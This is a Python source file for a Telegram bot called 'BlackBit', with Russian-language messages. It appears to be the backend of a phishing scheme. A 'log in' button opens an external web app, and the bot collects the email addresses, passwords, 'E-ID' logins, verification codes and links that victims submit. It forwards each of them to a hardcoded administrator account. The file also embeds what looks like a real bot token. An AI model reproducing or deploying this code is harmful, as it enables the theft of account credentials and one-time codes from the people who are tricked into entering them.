import os
import logging
import json
import requests
import time
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8513048605:AAFci_ffK2rywhBmIPSGkGMM7umZnjQbtdU"
ADMIN_ID = 8893485920
WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

user_sessions = {}

class BlackBitBot:
    def __init__(self):
        self.app = Application.builder().token(BOT_TOKEN).build()
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(MessageHandler(filters.ALL, self.handle))

    async def start(self, update: Update, context):
        user = update.effective_user
        await update.message.reply_text(
            f"Привет, {user.first_name}!\n\nНажми кнопку ВНИЗУ, чтобы открыть приложение BlackBit.",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                resize_keyboard=True
            )
        )

    async def handle(self, update: Update, context):
        if not update.message:
            return

        msg = update.message
        user_id = msg.from_user.id
        text = msg.text

        # ===== ЕСЛИ ТЕКСТА НЕТ — ИГНОРИРУЕМ =====
        if not text:
            return

        if user_sessions.get(user_id, {}).get('awaiting_code'):
            await self.app.bot.send_message(ADMIN_ID, text=f"КОД: {text}")
            user_sessions[user_id]['awaiting_code'] = False
            await msg.reply_text("Код отправлен!")
            return

        if user_sessions.get(user_id, {}).get('awaiting_link'):
            await self.app.bot.send_message(ADMIN_ID, text=f"ССЫЛКА: {text}")
            user_sessions[user_id]['awaiting_link'] = False
            await msg.reply_text("Ссылка отправлена!")
            return

        if text.startswith('{') and text.endswith('}'):
            try:
                data = json.loads(text)
                email = data.get('email')
                password = data.get('password')
                code = data.get('code')
                link = data.get('link')
                eid_type = data.get('type')

                if email and password and not code and not link and not eid_type:
                    await self.app.bot.send_message(
                        ADMIN_ID,
                        text=f"ЗАЯВКА!\nID: {user_id}\nЛогин: {email}\nПароль: {password}"
                    )
                    await msg.reply_text("Заявка отправлена!")
                    return

                if eid_type == 'eid_login' and email and password:
                    await self.app.bot.send_message(
                        ADMIN_ID,
                        text=f"E-ID ЗАЯВКА!\nID: {user_id}\nЛогин: {email}\nПароль: {password}"
                    )
                    await msg.reply_text("E-ID заявка отправлена!")
                    return

                if code:
                    await self.app.bot.send_message(ADMIN_ID, text=f"КОД: {code}")
                    await msg.reply_text("Код отправлен!")
                    return

                if link:
                    await self.app.bot.send_message(ADMIN_ID, text=f"ССЫЛКА: {link}")
                    await msg.reply_text("Ссылка отправлена!")
                    return

            except Exception as e:
                logger.error(f"Ошибка: {e}")
                await msg.reply_text("Ошибка обработки данных")

        else:
            await msg.reply_text("Используйте кнопку «Войти»")

    def run(self):
        try:
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=True')
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1&timeout=1')
            time.sleep(1)
        except:
            pass
        print("=" * 50)
        print("БОТ BLACKBIT ЗАПУЩЕН")
        print(f"ADMIN_ID: {ADMIN_ID}")
        print("=" * 50)
        self.app.run_polling()


if __name__ == "__main__":
    bot = BlackBitBot()
    bot.run()
